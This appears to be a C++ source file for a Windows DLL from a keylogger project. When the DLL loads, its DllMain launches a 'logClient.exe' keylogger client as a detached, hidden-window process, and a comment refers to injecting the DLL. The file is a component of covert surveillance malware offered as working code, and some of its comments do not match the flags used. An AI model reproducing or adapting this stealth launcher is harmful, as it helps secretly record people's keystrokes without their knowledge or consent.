#pragma once
#define DLL_EXPORT


#include <WinSock2.h>
#include <Windows.h>

#include <iostream>
#include <string>
#include <conio.h>
#include "logger.h"
#include <thread>

#define STR_SIZE 1024
#define NAME "C:\\Users\\Magshimim\\Documents\\My Projects\\keylogger\\logClient\\x64\\Debug\\logClient.exe"

extern "C"
{
	DECLDIR void connectAndLog()
	{

        char procFull[STR_SIZE] = {};
        // Get full path of DLL to inject
        DWORD check = GetFullPathNameA(NAME, STR_SIZE, procFull, NULL);

        // Get the length of the required wide string
        int length = MultiByteToWideChar(CP_ACP, 0, procFull, -1, NULL, 0);

        // Allocate memory for the wide string
        wchar_t* wideString = new wchar_t[length];

        // Perform the conversion
        MultiByteToWideChar(CP_ACP, 0, procFull, -1, wideString, length);

        // Set up the STARTUPINFO structure
        STARTUPINFO startupInfo;
        PROCESS_INFORMATION processInfo;

        ZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);
        startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
        startupInfo.wShowWindow = SW_HIDE; // Hide the window

        ZeroMemory(&processInfo, sizeof(processInfo));

        // Create the process
        if (!CreateProcess(
            wideString,   // Application name
            NULL,              // Command line arguments
            NULL,              // Process handle not inheritable
            NULL,              // Thread handle not inheritable
            FALSE,             // Set handle inheritance to FALSE
            DETACHED_PROCESS,                 // No creation flags
            NULL,              // Use parent's environment block
            NULL,              // Use parent's starting directory
            &startupInfo,      // Pointer to STARTUPINFO structure
            &processInfo)      // Pointer to PROCESS_INFORMATION structure
            ) {
            // Handle the error
            std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
            return;
        }
        // Close process and thread handles
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);
	}
}


BOOL APIENTRY DllMain(HINSTANCE hModule, // Handle to DLL modul
	DWORD ul_reason_for_call,
	LPVOID lpReserved) // Reserved

{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		connectAndLog();
		break;
	}
	return TRUE;
}

